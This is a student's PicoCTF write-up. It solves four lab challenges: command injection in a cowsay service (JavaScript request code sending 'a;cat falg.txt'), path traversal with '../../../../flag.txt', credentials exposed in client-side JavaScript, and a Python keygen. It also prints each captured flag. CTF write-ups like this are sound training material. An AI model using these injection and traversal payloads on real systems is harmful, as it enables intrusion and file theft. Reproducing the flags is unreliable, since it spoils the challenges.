# PicoCTF

## Web Exploitation

### CaaS
![image](https://github.com/codegallivant/cryptonite-taskphase/assets/27366422/5fbb2dc5-3a06-4028-a3f3-aa62e80031ec)
<br>
Made an XML HTTP request to the URL.
We can do this inside the console itself.

```javascript
var request = function(message) {
    const xhr = new XMLHttpRequest();
    xhr.open("GET", "https://caas.mars.picoctf.net/cowsay/"+message);
    xhr.send();
    xhr.responseType = "text";
    xhr.onload = () => {
    if (xhr.readyState == 4 && xhr.status == 200) {
        const data = xhr.response;
        console.log(data);
    } else {
        console.log(`Error: ${xhr.status}`);
    }
    };
};

request("somerandommessage")
```
![image](https://github.com/codegallivant/cryptonite-taskphase/assets/27366422/914122ac-6492-43b6-83db-f089519cc5f9)
<br>
The request is visible to be successful with a status 304.
<br>
![image](https://github.com/codegallivant/cryptonite-taskphase/assets/27366422/b1365e04-0da6-4222-8e3a-bf88e1bc9214)
<br>
Amazingly enough, the server is directly executing the text put in the URL. Adding a semicolon at the end of the message text will let me execute a command after it. A snippet from the provided ``index.js`` file -
<br>
![image](https://github.com/codegallivant/cryptonite-taskphase/assets/27366422/f6303078-ba02-4d57-a35c-ff4a2772fdd5)
<br>
I tried making a script to run a command but a CORS policy 'No-Access-Control-Origin' error came. Apparently only requests from the same origin are allowed. So I'll have to continue to use the browser console or just enter the URLs directly.
<br>
I try to see all the files present in the directory -
<br>
![image](https://github.com/codegallivant/cryptonite-taskphase/assets/27366422/ec3d400a-38b2-40d1-a79d-9f6bcb906f42)
<br>
Out of these, only ``falg.txt`` seems to contain the flag present. So I run ``cat falg.txt`` -
<br>
![image](https://github.com/codegallivant/cryptonite-taskphase/assets/27366422/bb9fbe7b-e0dd-4761-8a04-52fcfcf904ba)
<br>
The equivalent of the above would be to execute the following in the console - 
```javascript
var request = function(message) {
    const xhr = new XMLHttpRequest();
    xhr.open("GET", "https://caas.mars.picoctf.net/cowsay/"+message);
    xhr.send();
    xhr.responseType = "text";
    xhr.onload = () => {
    if (xhr.readyState == 4 && xhr.status == 200) {
        const data = xhr.response;
        console.log(data);
    } else {
        console.log(`Error: ${xhr.status}`);
    }
    };
};

request("a;cat falg.txt")
```
![image](https://github.com/codegallivant/cryptonite-taskphase/assets/27366422/e9c02879-017a-4f32-ac4c-f25376ff0a81)
<br>
<br>
**Flag obtained:** ``picoCTF{moooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0o}``

### Forbidden Paths
To go up 4 directories to ``flag.txt``, enter ``../../../../flag.txt`` in the input text box.
<br>
![image](https://github.com/codegallivant/cryptonite-taskphase/assets/27366422/c3ffe7fb-5052-4b38-9f43-071e7f8b1713)
<br>
**Flag obtained:** ``picoCTF{7h3_p47h_70_5ucc355_e5a6fcbc}``

### Local Authority
![image](https://github.com/codegallivant/cryptonite-taskphase/assets/27366422/6b8556c7-854e-4d81-91af-6e5ea6ebb4a0)
<br>
First checked source tab and network tab and read through the files. 
<br>
Then tried logging in with random credentials. 
<br>
The login failed. Then checked the network tab. Saw a ``secure.js`` file. It had the credentials in it.
![image](https://github.com/codegallivant/cryptonite-taskphase/assets/27366422/8baf007a-d5f3-414e-bd75-ec17082c3be1)
<br>
Logged in with these credentials and the flag was shown.
<br>
![image](https://github.com/codegallivant/cryptonite-taskphase/assets/27366422/9068fe91-9327-42e2-ae26-0c52b40ff641)
<br>
**Flag obtained:** ``picoCTF{j5_15_7r4n5p4r3n7_05df90c8}``

## Reverse Engineering
### keygenme-py
![image](https://github.com/codegallivant/cryptonite-taskphase/assets/27366422/55999ecb-dfff-4576-80a0-6280c0e9703c)

First I read through the program. Apparently they're using the Fernet library to decrypt an encrypted string. The key for this has to be provided by the user. However, before decrypting the string, they're checking whether the key is valid. In the ``check_key()`` function the program shows the structure of the key. Moreover much of the structure of the key is shown in the variable names.
<br>
![image](https://github.com/codegallivant/cryptonite-taskphase/assets/27366422/df66cc70-6c91-4344-886b-77f3335562b7)
<br>
![image](https://github.com/codegallivant/cryptonite-taskphase/assets/27366422/f7b0ba5b-169b-447f-9114-c996b714c50c)
<br><br>
The static part was already given. To get the dynamic part, I inserted the following snippet near the beginning of the code and ran it -
<br><br>
![image](https://github.com/codegallivant/cryptonite-taskphase/assets/27366422/84c29319-c585-498f-b408-baba8e140bca)
![image](https://github.com/codegallivant/cryptonite-taskphase/assets/27366422/ea97d16f-2093-4109-9eed-911bc88ed7f4)
<br><br>
The 2nd line is the flag.
<br>
**Flag obtained:** ``picoCTF{1n_7h3_|<3y_of_0d208392}``
